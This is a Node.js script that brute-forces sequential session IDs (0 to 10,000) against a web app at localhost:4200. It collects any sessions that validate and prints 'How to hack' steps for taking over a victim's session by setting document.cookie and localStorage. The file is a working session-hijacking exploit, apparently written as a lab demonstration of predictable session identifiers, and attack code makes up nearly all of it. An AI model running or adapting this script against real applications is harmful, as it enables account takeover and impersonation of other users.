const fetch = require('node-fetch');

const activeSessions = [];

let currentId = 0;
let maxId = 10000;
const attack = async (id) => {
  const response = await fetch("http://localhost:4200/api/session", {
    method: 'post',
    body: JSON.stringify({ sessionId: id }),
    headers: {
      cookie: `sessionId=${id}`,
    }
  });
  console.log(id, '[attack]', 'status: ', response.status);
  const json = await response.json().catch(() => { });
  if (json && json.sessionId) {
    activeSessions.push(json);
    console.log('[attack]', 'session: ', json);
  }

  if (currentId < maxId) return await attack(currentId++);
  return;
}

const main = async () => {
  await attack(currentId);
  console.log('[main]', 'activeSessions: ', activeSessions);
  console.log('How to hack');
  console.log('1. Add a new sessionId to the cookie', 'document.cookie="sessionId=xxxx"');
  console.log('2. Add a session to localstore', `localStorage.setItem('session', JSON.stringify({ name: 'victim', sessionId: 'XXXX' }));`);
};

main();

// for (let i = 0; i < 10000; i++) {
  // fetch("http://localhost:4200/api/session", {
  //   method: 'post',
  //   body: JSON.stringify({ sessionId: i }),
  //   headers: {
  //     cookie: `sessionId=${i}`,
  //   }
  // })
  //   .then((response) => {
  //     // Do something with response
  //     console.log('[response]', response.status)
  //     return response.json();
  //   })
  //   .then(data => {
  //     console.log(data);
  //   })
  //   .catch(function (err) {
  //     // console.log("Unable to fetch -", err);
  //   });
// }